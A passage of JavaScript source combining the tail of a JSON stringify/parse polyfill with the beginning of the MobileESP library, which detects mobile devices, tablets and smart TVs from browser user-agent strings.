        Date.prototype.toJSON = function() {

            return isFinite(this.valueOf()) ? this.getUTCFullYear() + "-" + f(this.getUTCMonth() + 1) + "-" + f(this.getUTCDate()) + "T" + f(this.getUTCHours()) + ":" + f(this.getUTCMinutes()) + ":" + f(this.getUTCSeconds()) + "Z" : null;
        }
        ;

        Boolean.prototype.toJSON = this_value;
        Number.prototype.toJSON = this_value;
        String.prototype.toJSON = this_value;
    }

    var gap;
    var indent;
    var meta;
    var rep;

    function quote(string) {

        // If the string contains no control characters, no quote characters, and no
        // backslash characters, then we can safely slap some quotes around it.
        // Otherwise we must also replace the offending characters with safe escape
        // sequences.

        rx_escapable.lastIndex = 0;
        return rx_escapable.test(string) ? "\"" + string.replace(rx_escapable, function(a) {
            var c = meta[a];
            return typeof c === "string" ? c : "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
        }) + "\"" : "\"" + string + "\"";
    }

    function str(key, holder) {

        // Produce a string from holder[key].

        var i;
        // The loop counter.
        var k;
        // The member key.
        var v;
        // The member value.
        var length;
        var mind = gap;
        var partial;
        var value = holder[key];

        // If the value has a toJSON method, call it to obtain a replacement value.

        if (value && typeof value === "object" && typeof value.toJSON === "function") {
            value = value.toJSON(key);
        }

        // If we were called with a replacer function, then call the replacer to
        // obtain a replacement value.

        if (typeof rep === "function") {
            value = rep.call(holder, key, value);
        }

        // What happens next depends on the value's type.

        switch (typeof value) {
        case "string":
            return quote(value);

        case "number":

            // JSON numbers must be finite. Encode non-finite numbers as null.

            return isFinite(value) ? String(value) : "null";

        case "boolean":
        case "null":

            // If the value is a boolean or null, convert it to a string. Note:
            // typeof null does not produce "null". The case is included here in
            // the remote chance that this gets fixed someday.

            return String(value);

            // If the type is "object", we might be dealing with an object or an array or
            // null.

        case "object":

            // Due to a specification blunder in ECMAScript, typeof null is "object",
            // so watch out for that case.

            if (!value) {
                return "null";
            }

            // Make an array to hold the partial results of stringifying this object value.

            gap += indent;
            partial = [];

            // Is the value an array?

            if (Object.prototype.toString.apply(value) === "[object Array]") {

                // The value is an array. Stringify every element. Use null as a placeholder
                // for non-JSON values.

                length = value.length;
                for (i = 0; i < length; i += 1) {
                    partial[i] = str(i, value) || "null";
                }

                // Join all of the elements together, separated with commas, and wrap them in
                // brackets.

                v = partial.length === 0 ? "[]" : gap ? "[\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "]" : "[" + partial.join(",") + "]";
                gap = mind;
                return v;
            }

            // If the replacer is an array, use it to select the members to be stringified.

            if (rep && typeof rep === "object") {
                length = rep.length;
                for (i = 0; i < length; i += 1) {
                    if (typeof rep[i] === "string") {
                        k = rep[i];
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ": " : ":") + v);
                        }
                    }
                }
            } else {

                // Otherwise, iterate through all of the keys in the object.

                for (k in value) {
                    if (Object.prototype.hasOwnProperty.call(value, k)) {
                        v = str(k, value);
                        if (v) {
                            partial.push(quote(k) + (gap ? ": " : ":") + v);
                        }
                    }
                }
            }

            // Join all of the member texts together, separated with commas,
            // and wrap them in braces.

            v = partial.length === 0 ? "{}" : gap ? "{\n" + gap + partial.join(",\n" + gap) + "\n" + mind + "}" : "{" + partial.join(",") + "}";
            gap = mind;
            return v;
        }
    }

    // If the JSON object does not yet have a stringify method, give it one.

    if (typeof JSON.stringify !== "function") {
        meta = {
            // table of character substitutions
            "\b": "\\b",
            "\t": "\\t",
            "\n": "\\n",
            "\f": "\\f",
            "\r": "\\r",
            "\"": "\\\"",
            "\\": "\\\\"
        };
        JSON.stringify = function(value, replacer, space) {

            // The stringify method takes a value and an optional replacer, and an optional
            // space parameter, and returns a JSON text. The replacer can be a function
            // that can replace values, or an array of strings that will select the keys.
            // A default replacer method can be provided. Use of the space parameter can
            // produce text that is more easily readable.

            var i;
            gap = "";
            indent = "";

            // If the space parameter is a number, make an indent string containing that
            // many spaces.

            if (typeof space === "number") {
                for (i = 0; i < space; i += 1) {
                    indent += " ";
                }

                // If the space parameter is a string, it will be used as the indent string.

            } else if (typeof space === "string") {
                indent = space;
            }

            // If there is a replacer, it must be a function or an array.
            // Otherwise, throw an error.

            rep = replacer;
            if (replacer && typeof replacer !== "function" && (typeof replacer !== "object" || typeof replacer.length !== "number")) {
                throw new Error("JSON.stringify");
            }

            // Make a fake root object containing our value under the key of "".
            // Return the result of stringifying the value.

            return str("", {
                "": value
            });
        }
        ;
    }

    // If the JSON object does not yet have a parse method, give it one.

    if (typeof JSON.parse !== "function") {
        JSON.parse = function(text, reviver) {

            // The parse method takes a text and an optional reviver function, and returns
            // a JavaScript value if the text is a valid JSON text.

            var j;

            function walk(holder, key) {

                // The walk method is used to recursively walk the resulting structure so
                // that modifications can be made.

                var k;
                var v;
                var value = holder[key];
                if (value && typeof value === "object") {
                    for (k in value) {
                        if (Object.prototype.hasOwnProperty.call(value, k)) {
                            v = walk(value, k);
                            if (v !== undefined) {
                                value[k] = v;
                            } else {
                                delete value[k];
                            }
                        }
                    }
                }
                return reviver.call(holder, key, value);
            }

            // Parsing happens in four stages. In the first stage, we replace certain
            // Unicode characters with escape sequences. JavaScript handles many characters
            // incorrectly, either silently deleting them, or treating them as line endings.

            text = String(text);
            rx_dangerous.lastIndex = 0;
            if (rx_dangerous.test(text)) {
                text = text.replace(rx_dangerous, function(a) {
                    return "\\u" + ("0000" + a.charCodeAt(0).toString(16)).slice(-4);
                });
            }

            // In the second stage, we run the text against regular expressions that look
            // for non-JSON patterns. We are especially concerned with "()" and "new"
            // because they can cause invocation, and "=" because it can cause mutation.
            // But just to be safe, we want to reject all unexpected forms.

            // We split the second stage into 4 regexp operations in order to work around
            // crippling inefficiencies in IE's and Safari's regexp engines. First we
            // replace the JSON backslash pairs with "@" (a non-JSON character). Second, we
            // replace all simple value tokens with "]" characters. Third, we delete all
            // open brackets that follow a colon or comma or that begin the text. Finally,
            // we look to see that the remaining characters are only whitespace or "]" or
            // "," or ":" or "{" or "}". If that is so, then the text is safe for eval.

            if (rx_one.test(text.replace(rx_two, "@").replace(rx_three, "]").replace(rx_four, ""))) {

                // In the third stage we use the eval function to compile the text into a
                // JavaScript structure. The "{" operator is subject to a syntactic ambiguity
                // in JavaScript: it can begin a block or an object literal. We wrap the text
                // in parens to eliminate the ambiguity.

                j = eval("(" + text + ")");

                // In the optional fourth stage, we recursively walk the new structure, passing
                // each name/value pair to a reviver function for possible transformation.

                return (typeof reviver === "function") ? walk({
                    "": j
                }, "") : j;
            }

            // If the text is not JSON parseable, then a SyntaxError is thrown.

            throw new SyntaxError("JSON.parse");
        }
        ;
    }
}());

/* *******************************************
// Copyright 2010-2015, Anthony Hand
//
// BETA NOTICE
// Previous versions of the JavaScript code for MobileESP were 'regular' 
// JavaScript. The strength of it was that it was really easy to code and use.
// Unfortunately, regular JavaScript means that all variables and functions
// are in the global namespace. There can be collisions with other code libraries
// which may have similar variable or function names. Collisions cause bugs as each
// library changes a variable's definition or functionality unexpectedly.
// As a result, we thought it wise to switch to an "object oriented" style of code.
// This 'literal notation' technique keeps all MobileESP variables and functions fully self-contained.
// It avoids potential for collisions with other JavaScript libraries.
// This technique allows the developer continued access to any desired function or property.
//
// Please send feedback to project founder Anthony Hand: anthony.hand@gmail.com
//
//
// File version 2015.05.13 (May 13, 2015)
// Updates:
//	- Moved MobileESP to GitHub. https://github.com/ahand/mobileesp
//	- Opera Mobile/Mini browser has the same UA string on multiple platforms and doesn't differentiate phone vs. tablet. 
//		- Removed DetectOperaAndroidPhone(). This method is no longer reliable. 
//		- Removed DetectOperaAndroidTablet(). This method is no longer reliable. 
//	- Added support for Windows Phone 10: variable and DetectWindowsPhone10()
//	- Updated DetectWindowsPhone() to include WP10. 
//	- Added support for Firefox OS.  
//		- A variable plus DetectFirefoxOS(), DetectFirefoxOSPhone(), DetectFirefoxOSTablet()
//		- NOTE: Firefox doesn't add UA tokens to definitively identify Firefox OS vs. their browsers on other mobile platforms.
//	- Added support for Sailfish OS. Not enough info to add a tablet detection method at this time. 
//		- A variable plus DetectSailfish(), DetectSailfishPhone()
//	- Added support for Ubuntu Mobile OS. 
//		- DetectUbuntu(), DetectUbuntuPhone(), DetectUbuntuTablet()
//	- Added support for 2 smart TV OSes. They lack browsers but do have WebViews for use by HTML apps. 
//		- One variable for Samsung Tizen TVs, plus DetectTizenTV()
//		- One variable for LG WebOS TVs, plus DetectWebOSTV()
//	- Updated DetectTizen(). Now tests for “mobile” to disambiguate from Samsung Smart TVs
//	- Removed variables for obsolete devices: deviceHtcFlyer, deviceXoom.
//	- Updated DetectAndroid(). No longer has a special test case for the HTC Flyer tablet. 
//	- Updated DetectAndroidPhone(). 
//		- Updated internal detection code for Android. 
//		- No longer has a special test case for the HTC Flyer tablet. 
//		- Checks against DetectOperaMobile() on Android and reports here if relevant. 
//	- Updated DetectAndroidTablet(). 
//		- No longer has a special test case for the HTC Flyer tablet. 
//		- Checks against DetectOperaMobile() on Android to exclude it from here.
//	- DetectMeego(): Changed definition for this method. Now detects any Meego OS device, not just phones. 
//	- DetectMeegoPhone(): NEW. For Meego phones. Ought to detect Opera browsers on Meego, as well.  
//	- DetectTierIphone(): Added support for phones running Sailfish, Ubuntu and Firefox Mobile. 
//	- DetectTierTablet(): Added support for tablets running Ubuntu and Firefox Mobile. 
//	- DetectSmartphone(): Added support for Meego phones. 
//	- Reorganized DetectMobileQuick(). Moved the following to DetectMobileLong():
//		- DetectDangerHiptop(), DetectMaemoTablet(), DetectSonyMylo(), DetectArchos()
//       
//
//
// LICENSE INFORMATION
// Licensed under the Apache License, Version 2.0 (the "License"); 
// you may not use this file except in compliance with the License. 
// You may obtain a copy of the License at 
//        http://www.apache.org/licenses/LICENSE-2.0 
// Unless required by applicable law or agreed to in writing, 
// software distributed under the License is distributed on an 
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, 
// either express or implied. See the License for the specific 
// language governing permissions and limitations under the License. 
//
//
// ABOUT THIS PROJECT
//   Project Owner: Anthony Hand
//   Email: anthony.hand@gmail.com
//   Web Site: http://www.mobileesp.com
//   Source Files: https://github.com/ahand/mobileesp
//   
//   Versions of this code are available for:
//      PHP, JavaScript, Java, ASP.NET (C#), Ruby and others
//
//
// WARNING: 
//   These JavaScript-based device detection features may ONLY work 
//   for the newest generation of smartphones, such as the iPhone, 
//   Android and Palm WebOS devices.
//   These device detection features may NOT work for older smartphones 
//   which had poor support for JavaScript, including 
//   older BlackBerry, PalmOS, and Windows Mobile devices. 
//   Additionally, because JavaScript support is extremely poor among 
//   'feature phones', these features may not work at all on such devices.
//   For better results, consider using a server-based version of this code, 
//   such as Java, APS.NET, PHP, or Ruby.
//
// *******************************************
*/

var MobileEsp = {

    //GLOBALLY USEFUL VARIABLES
    //Note: These values are set automatically during the Init function.
    //Stores whether we're currently initializing the most popular functions.
    initCompleted: false,
    isWebkit: false,
    //Stores the result of DetectWebkit()
    isMobilePhone: false,
    //Stores the result of DetectMobileQuick()
    isIphone: false,
    //Stores the result of DetectIphone()
    isAndroid: false,
    //Stores the result of DetectAndroid()
    isAndroidPhone: false,
    //Stores the result of DetectAndroidPhone()
    isTierTablet: false,
    //Stores the result of DetectTierTablet()
    isTierIphone: false,
    //Stores the result of DetectTierIphone()
    isTierRichCss: false,
    //Stores the result of DetectTierRichCss()
    isTierGenericMobile: false,
    //Stores the result of DetectTierOtherPhones()

    //INTERNALLY USED DETECTION STRING VARIABLES
    engineWebKit: 'webkit',
    deviceIphone: 'iphone',
    deviceIpod: 'ipod',
    deviceIpad: 'ipad',
    deviceMacPpc: 'macintosh',
    //Used for disambiguation

    deviceAndroid: 'android',
    deviceGoogleTV: 'googletv',

    deviceWinPhone7: 'windows phone os 7',
    deviceWinPhone8: 'windows phone 8',
    deviceWinPhone10: 'windows phone 10',
    deviceWinMob: 'windows ce',
    deviceWindows: 'windows',
    deviceIeMob: 'iemobile',
    devicePpc: 'ppc',
    //Stands for PocketPC
    enginePie: 'wm5 pie',
    //An old Windows Mobile

    deviceBB: 'blackberry',
    deviceBB10: 'bb10',
    //For the new BB 10 OS
    vndRIM: 'vnd.rim',
    //Detectable when BB devices emulate IE or Firefox
    deviceBBStorm: 'blackberry95',
    //Storm 1 and 2
    deviceBBBold: 'blackberry97',
    //Bold 97x0 (non-touch)
    deviceBBBoldTouch: 'blackberry 99',
    //Bold 99x0 (touchscreen)
    deviceBBTour: 'blackberry96',
    //Tour
    deviceBBCurve: 'blackberry89',
    //Curve 2
    deviceBBCurveTouch: 'blackberry 938',
    //Curve Touch 9380
    deviceBBTorch: 'blackberry 98',
    //Torch
    deviceBBPlaybook: 'playbook',
    //PlayBook tablet

    deviceSymbian: 'symbian',
    deviceSymbos: 'symbos',
    //Opera 10 on Symbian
    deviceS60: 'series60',
    deviceS70: 'series70',
    deviceS80: 'series80',
    deviceS90: 'series90',

    devicePalm: 'palm',
    deviceWebOS: 'webos',
    //For Palm devices 
    deviceWebOStv: 'web0s',
    //For LG TVs
    deviceWebOShp: 'hpwos',
    //For HP's line of WebOS devices

    deviceNuvifone: 'nuvifone',
    //Garmin Nuvifone
    deviceBada: 'bada',
    //Samsung's Bada OS
    deviceTizen: 'tizen',
    //Tizen OS
    deviceMeego: 'meego',
    //Meego OS
    deviceSailfish: 'sailfish',
    //Sailfish OS
    deviceUbuntu: 'ubuntu',
    //Ubuntu Mobile OS

    deviceKindle: 'kindle',
    //Amazon eInk Kindle
    engineSilk: 'silk-accelerated',
    //Amazon's accelerated Silk browser for Kindle Fire

    engineBlazer: 'blazer',
    //Old Palm browser
    engineXiino: 'xiino',

    //Initialize variables for mobile-specific content.
    vndwap: 'vnd.wap',
    wml: 'wml',

    //Initialize variables for random devices and mobile browsers.
    //Some of these may not support JavaScript
    deviceTablet: 'tablet',
    deviceBrew: 'brew',
    deviceDanger: 'danger',
    deviceHiptop: 'hiptop',
    devicePlaystation: 'playstation',
    devicePlaystationVita: 'vita',
    deviceNintendoDs: 'nitro',
    deviceNintendo: 'nintendo',
    deviceWii: 'wii',
    deviceXbox: 'xbox',
    deviceArchos: 'archos',

    engineFirefox: 'firefox',
    //For Firefox OS
    engineOpera: 'opera',
    //Popular browser
    engineNetfront: 'netfront',
    //Common embedded OS browser
    engineUpBrowser: 'up.browser',
    //common on some phones
    deviceMidp: 'midp',
    //a mobile Java technology
    uplink: 'up.link',
    engineTelecaQ: 'teleca q',
    //a modern feature phone browser
    engineObigo: 'obigo',
    //W 10 is a modern feature phone browser

    devicePda: 'pda',
    mini: 'mini',
    //Some mobile browsers put 'mini' in their names
    mobile: 'mobile',
    //Some mobile browsers put 'mobile' in their user agent strings
    mobi: 'mobi',
    //Some mobile browsers put 'mobi' in their user agent strings

    //Smart TV strings
    smartTV1: 'smart-tv',
    //Samsung Tizen smart TVs
    smartTV2: 'smarttv',
    //LG WebOS smart TVs

    //Use Maemo, Tablet, and Linux to test for Nokia's Internet Tablets.
    maemo: 'maemo',
    linux: 'linux',
    mylocom2: 'sony/com',
    // for Sony Mylo 1 and 2

    //In some UserAgents, the only clue is the manufacturer
    manuSonyEricsson: 'sonyericsson',
    manuericsson: 'ericsson',
    manuSamsung1: 'sec-sgh',
    manuSony: 'sony',
    manuHtc: 'htc',
    //Popular Android and WinMo manufacturer

    //In some UserAgents, the only clue is the operator
    svcDocomo: 'docomo',
    svcKddi: 'kddi',
    svcVodafone: 'vodafone',

    //Disambiguation strings.
    disUpdate: 'update',
    //pda vs. update

    //Holds the User Agent string value.
    uagent: '',

    //Initializes key MobileEsp variables
    InitDeviceScan: function() {
        this.initCompleted = false;

        if (navigator && navigator.userAgent)
            this.uagent = navigator.userAgent.toLowerCase();

        //Save these properties to speed processing
        this.isWebkit = this.DetectWebkit();
        this.isIphone = this.DetectIphone();
        this.isAndroid = this.DetectAndroid();
        this.isAndroidPhone = this.DetectAndroidPhone();

        //Generally, these tiers are the most useful for web development
        this.isMobilePhone = this.DetectMobileQuick();
        this.isTierIphone = this.DetectTierIphone();
        this.isTierTablet = this.DetectTierTablet();

        //Optional: Comment these out if you NEVER use them
        this.isTierRichCss = this.DetectTierRichCss();
        this.isTierGenericMobile = this.DetectTierOtherPhones();

        this.initCompleted = true;
    },

    //APPLE IOS

    //**************************
    // Detects if the current device is an iPhone.
    DetectIphone: function() {
        if (this.initCompleted || this.isIphone)
            return this.isIphone;

        if (this.uagent.search(this.deviceIphone) > -1) {
            //The iPad and iPod Touch say they're an iPhone! So let's disambiguate.
            if (this.DetectIpad() || this.DetectIpod())
                return false;
                //Yay! It's an iPhone!
            else
                return true;
        } else
            return false;
    },

    //**************************
    // Detects if the current device is an iPod Touch.
    DetectIpod: function() {
        if (this.uagent.search(this.deviceIpod) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is an iPhone or iPod Touch.
    DetectIphoneOrIpod: function() {
        //We repeat the searches here because some iPods 
        //  may report themselves as an iPhone, which is ok.
        if (this.DetectIphone() || this.DetectIpod())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is an iPad tablet.
    DetectIpad: function() {
        if (this.uagent.search(this.deviceIpad) > -1 && this.DetectWebkit())
            return true;
        else
            return false;
    },

    //**************************
    // Detects *any* iOS device: iPhone, iPod Touch, iPad.
    DetectIos: function() {
        if (this.DetectIphoneOrIpod() || this.DetectIpad())
            return true;
        else
            return false;
    },

    //ANDROID

    //**************************
    // Detects *any* Android OS-based device: phone, tablet, and multi-media player.
    // Also detects Google TV.
    DetectAndroid: function() {
        if (this.initCompleted || this.isAndroid)
            return this.isAndroid;

        if ((this.uagent.search(this.deviceAndroid) > -1) || this.DetectGoogleTV())
            return true;

        return false;
    },

    //**************************
    // Detects if the current device is a (small-ish) Android OS-based device
    // used for calling and/or multi-media (like a Samsung Galaxy Player).
    // Google says these devices will have 'Android' AND 'mobile' in user agent.
    // Ignores tablets (Honeycomb and later).
    DetectAndroidPhone: function() {
        if (this.initCompleted || this.isAndroidPhone)
            return this.isAndroidPhone;

        //First, let's make sure we're on an Android device.
        if (!this.DetectAndroid())
            return false;

        //If it's Android and has 'mobile' in it, Google says it's a phone.
        if (this.uagent.search(this.mobile) > -1)
            return true;

        //Special check for Android phones with Opera Mobile. They should report here.
        if (this.DetectOperaMobile())
            return true;

        return false;
    },

    //**************************
    // Detects if the current device is a (self-reported) Android tablet.
    // Google says these devices will have 'Android' and NOT 'mobile' in their user agent.
    DetectAndroidTablet: function() {
        //First, let's make sure we're on an Android device.
        if (!this.DetectAndroid())
            return false;

        //Special check for Opera Android Phones. They should NOT report here.
        if (this.DetectOperaMobile())
            return false;

        //Otherwise, if it's Android and does NOT have 'mobile' in it, Google says it's a tablet.
        if (this.uagent.search(this.mobile) > -1)
            return false;
        else
            return true;
    },

    //**************************
    // Detects if the current device is an Android OS-based device and
    //   the browser is based on WebKit.
    DetectAndroidWebKit: function() {
        if (this.DetectAndroid() && this.DetectWebkit())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is a GoogleTV.
    DetectGoogleTV: function() {
        if (this.uagent.search(this.deviceGoogleTV) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is based on WebKit.
    DetectWebkit: function() {
        if (this.initCompleted || this.isWebkit)
            return this.isWebkit;

        if (this.uagent.search(this.engineWebKit) > -1)
            return true;
        else
            return false;
    },

    //WINDOWS MOBILE AND PHONE

    // Detects if the current browser is a 
    // Windows Phone 7, 8, or 10 device.
    DetectWindowsPhone: function() {
        if (this.DetectWindowsPhone7() || this.DetectWindowsPhone8() || this.DetectWindowsPhone10())
            return true;
        else
            return false;
    },

    //**************************
    // Detects a Windows Phone 7 device (in mobile browsing mode).
    DetectWindowsPhone7: function() {
        if (this.uagent.search(this.deviceWinPhone7) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a Windows Phone 8 device (in mobile browsing mode).
    DetectWindowsPhone8: function() {
        if (this.uagent.search(this.deviceWinPhone8) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a Windows Phone 10 device (in mobile browsing mode).
    DetectWindowsPhone10: function() {
        if (this.uagent.search(this.deviceWinPhone10) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a Windows Mobile device.
    // Excludes Windows Phone 7 and later devices. 
    // Focuses on Windows Mobile 6.xx and earlier.
    DetectWindowsMobile: function() {
        if (this.DetectWindowsPhone())
            return false;

        //Most devices use 'Windows CE', but some report 'iemobile' 
        //  and some older ones report as 'PIE' for Pocket IE. 
        if (this.uagent.search(this.deviceWinMob) > -1 || this.uagent.search(this.deviceIeMob) > -1 || this.uagent.search(this.enginePie) > -1)
            return true;
        //Test for Windows Mobile PPC but not old Macintosh PowerPC.
        if ((this.uagent.search(this.devicePpc) > -1) && !(this.uagent.search(this.deviceMacPpc) > -1))
            return true;
        //Test for Windwos Mobile-based HTC devices.
        if (this.uagent.search(this.manuHtc) > -1 && this.uagent.search(this.deviceWindows) > -1)
            return true;
        else
            return false;
    },

    //BLACKBERRY

    //**************************
    // Detects if the current browser is a BlackBerry of some sort.
    // Includes BB10 OS, but excludes the PlayBook.
    DetectBlackBerry: function() {
        if ((this.uagent.search(this.deviceBB) > -1) || (this.uagent.search(this.vndRIM) > -1))
            return true;
        if (this.DetectBlackBerry10Phone())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a BlackBerry 10 OS phone.
    // Excludes tablets.
    DetectBlackBerry10Phone: function() {
        if ((this.uagent.search(this.deviceBB10) > -1) && (this.uagent.search(this.mobile) > -1))
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is on a BlackBerry tablet device.
    //    Example: PlayBook
    DetectBlackBerryTablet: function() {
        if (this.uagent.search(this.deviceBBPlaybook) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a BlackBerry device AND uses a
    //    WebKit-based browser. These are signatures for the new BlackBerry OS 6.
    //    Examples: Torch. Includes the Playbook.
    DetectBlackBerryWebKit: function() {
        if (this.DetectBlackBerry() && this.uagent.search(this.engineWebKit) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a BlackBerry Touch
    //    device, such as the Storm, Torch, and Bold Touch. Excludes the Playbook.
    DetectBlackBerryTouch: function() {
        if (this.DetectBlackBerry() && ((this.uagent.search(this.deviceBBStorm) > -1) || (this.uagent.search(this.deviceBBTorch) > -1) || (this.uagent.search(this.deviceBBBoldTouch) > -1) || (this.uagent.search(this.deviceBBCurveTouch) > -1)))
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a BlackBerry OS 5 device AND
    //    has a more capable recent browser. Excludes the Playbook.
    //    Examples, Storm, Bold, Tour, Curve2
    //    Excludes the new BlackBerry OS 6 and 7 browser!!
    DetectBlackBerryHigh: function() {
        //Disambiguate for BlackBerry OS 6 or 7 (WebKit) browser
        if (this.DetectBlackBerryWebKit())
            return false;
        if ((this.DetectBlackBerry()) && (this.DetectBlackBerryTouch() || this.uagent.search(this.deviceBBBold) > -1 || this.uagent.search(this.deviceBBTour) > -1 || this.uagent.search(this.deviceBBCurve) > -1))
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a BlackBerry device AND
    //    has an older, less capable browser. 
    //    Examples: Pearl, 8800, Curve1.
    DetectBlackBerryLow: function() {
        if (this.DetectBlackBerry()) {
            //Assume that if it's not in the High tier or has WebKit, then it's Low.
            if (this.DetectBlackBerryHigh() || this.DetectBlackBerryWebKit())
                return false;
            else
                return true;
        } else
            return false;
    },

    //SYMBIAN

    //**************************
    // Detects if the current browser is the Nokia S60 Open Source Browser.
    DetectS60OssBrowser: function() {
        if (this.DetectWebkit()) {
            if ((this.uagent.search(this.deviceS60) > -1 || this.uagent.search(this.deviceSymbian) > -1))
                return true;
            else
                return false;
        } else
            return false;
    },

    //**************************
    // Detects if the current device is any Symbian OS-based device,
    //   including older S60, Series 70, Series 80, Series 90, and UIQ, 
    //   or other browsers running on these devices.
    DetectSymbianOS: function() {
        if (this.uagent.search(this.deviceSymbian) > -1 || this.uagent.search(this.deviceS60) > -1 || ((this.uagent.search(this.deviceSymbos) > -1) && (this.DetectOperaMobile)) || //Opera 10
        this.uagent.search(this.deviceS70) > -1 || this.uagent.search(this.deviceS80) > -1 || this.uagent.search(this.deviceS90) > -1)
            return true;
        else
            return false;
    },

    //WEBOS AND PALM

    //**************************
    // Detects if the current browser is on a PalmOS device.
    DetectPalmOS: function() {
        //Make sure it's not WebOS first
        if (this.DetectPalmWebOS())
            return false;

        //Most devices nowadays report as 'Palm', 
        //  but some older ones reported as Blazer or Xiino.
        if (this.uagent.search(this.devicePalm) > -1 || this.uagent.search(this.engineBlazer) > -1 || this.uagent.search(this.engineXiino) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is on a Palm device
    //   running the new WebOS.
    DetectPalmWebOS: function() {
        if (this.uagent.search(this.deviceWebOS) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is on an HP tablet running WebOS.
    DetectWebOSTablet: function() {
        if (this.uagent.search(this.deviceWebOShp) > -1 && this.uagent.search(this.deviceTablet) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is on a WebOS smart TV.
    DetectWebOSTV: function() {
        if (this.uagent.search(this.deviceWebOStv) > -1 && this.uagent.search(this.smartTV2) > -1)
            return true;
        else
            return false;
    },

    //OPERA

    //**************************
    // Detects if the current browser is Opera Mobile or Mini.
    // Note: Older embedded Opera on mobile devices didn't follow these naming conventions.
    //   Like Archos media players, they will probably show up in DetectMobileQuick or -Long instead. 
    DetectOperaMobile: function() {
        if ((this.uagent.search(this.engineOpera) > -1) && ((this.uagent.search(this.mini) > -1 || this.uagent.search(this.mobi) > -1)))
            return true;
        else
            return false;
    },

    //MISCELLANEOUS DEVICES

    //**************************
    // Detects if the current device is an Amazon Kindle (eInk devices only).
    // Note: For the Kindle Fire, use the normal Android methods.
    DetectKindle: function() {
        if (this.uagent.search(this.deviceKindle) > -1 && !this.DetectAndroid())
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current Amazon device has turned on the Silk accelerated browsing feature.
    // Note: Typically used by the the Kindle Fire.
    DetectAmazonSilk: function() {
        if (this.uagent.search(this.engineSilk) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a
    //   Garmin Nuvifone.
    DetectGarminNuvifone: function() {
        if (this.uagent.search(this.deviceNuvifone) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a device running the Bada OS from Samsung.
    DetectBada: function() {
        if (this.uagent.search(this.deviceBada) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a device running the Tizen smartphone OS.
    DetectTizen: function() {
        if (this.uagent.search(this.deviceTizen) > -1 && this.uagent.search(this.mobile) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is on a Tizen smart TV.
    DetectTizenTV: function() {
        if (this.uagent.search(this.deviceTizen) > -1 && this.uagent.search(this.smartTV1) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a device running the Meego OS.
    DetectMeego: function() {
        if (this.uagent.search(this.deviceMeego) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a phone running the Meego OS.
    DetectMeegoPhone: function() {
        if (this.uagent.search(this.deviceMeego) > -1 && this.uagent.search(this.mobi) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a mobile device (probably) running the Firefox OS.
    DetectFirefoxOS: function() {
        if (this.DetectFirefoxOSPhone() || this.DetectFirefoxOSTablet())
            return true;
        else
            return false;
    },

    //**************************
    // Detects a phone (probably) running the Firefox OS.
    DetectFirefoxOSPhone: function() {
        //First, let's make sure we're NOT on another major mobile OS.
        if (this.DetectIos() || this.DetectAndroid() || this.DetectSailfish())
            return false;

        if ((this.uagent.search(this.engineFirefox) > -1) && (this.uagent.search(this.mobile) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects a tablet (probably) running the Firefox OS.
    DetectFirefoxOSTablet: function() {
        //First, let's make sure we're NOT on another major mobile OS.
        if (this.DetectIos() || this.DetectAndroid() || this.DetectSailfish())
            return false;

        if ((this.uagent.search(this.engineFirefox) > -1) && (this.uagent.search(this.deviceTablet) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects a device running the Sailfish OS.
    DetectSailfish: function() {
        if (this.uagent.search(this.deviceSailfish) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects a phone running the Sailfish OS.
    DetectSailfishPhone: function() {
        if (this.DetectSailfish() && (this.uagent.search(this.mobile) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects a mobile device running the Ubuntu Mobile OS.
    DetectUbuntu: function() {
        if (this.DetectUbuntuPhone() || this.DetectUbuntuTablet())
            return true;
        else
            return false;
    },

    //**************************
    // Detects a phone running the Ubuntu Mobile OS.
    DetectUbuntuPhone: function() {
        if ((this.uagent.search(this.deviceUbuntu) > -1) && (this.uagent.search(this.mobile) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects a tablet running the Ubuntu Mobile OS.
    DetectUbuntuTablet: function() {
        if ((this.uagent.search(this.deviceUbuntu) > -1) && (this.uagent.search(this.deviceTablet) > -1))
            return true;

        return false;
    },

    //**************************
    // Detects the Danger Hiptop device.
    DetectDangerHiptop: function() {
        if (this.uagent.search(this.deviceDanger) > -1 || this.uagent.search(this.deviceHiptop) > -1)
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current browser is a Sony Mylo device.
    DetectSonyMylo: function() {
        if ((this.uagent.search(this.manuSony) > -1) && ((this.uagent.search(this.qtembedded) > -1) || (this.uagent.search(this.mylocom2) > -1)))
            return true;
        else
            return false;
    },

    //**************************
    // Detects if the current device is on one of 
    // the Maemo-based Nokia Internet Tablets.
